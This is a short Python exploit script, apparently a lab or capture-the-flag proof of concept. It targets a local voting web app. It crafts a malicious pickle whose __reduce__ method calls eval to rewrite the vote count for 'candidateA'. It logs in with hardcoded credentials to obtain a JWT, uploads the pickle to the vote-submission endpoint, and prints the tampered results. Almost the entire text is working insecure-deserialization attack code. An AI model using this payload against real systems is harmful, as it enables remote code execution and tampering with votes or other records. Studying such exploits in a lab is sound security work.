import pickle
import requests

# Define a class with a custom __reduce__ method to exploit deserialization
class MaliciousPayload:
    def __reduce__(self):
        return (eval, ("votes.update({'candidateA': 39900})",))

# Serialize the malicious object
malicious_payload = pickle.dumps(MaliciousPayload())

login_url = "http://localhost:8080/login"
login_data = {
    "username": "123456789",  # Replace with the hardcoded username
    "password": "password"  # Replace with the hardcoded password
}
login_response = requests.post(login_url, json=login_data)

if login_response.status_code == 200:
    token = login_response.json().get("token")
    print("JWT token obtained:", token)
else:
    print("Failed to obtain JWT token:", login_response.text)
    exit()

# Send the payload to the server
# Make sure your server is running by executing `python app.py` in another terminal.
url = "http://localhost:8080/vote/submit"
files = {
    "file": ("malicious.pkl", malicious_payload)
}

headers = {
    "Authorization": f"Bearer {token}"  # Include the JWT token in the Authorization header
}

response = requests.post(url, files=files, headers=headers)
# print("Response from server:", response.text)

# Check the results
results = requests.get("http://localhost:8080/vote/results")
print("Results after exploit:", results.text)
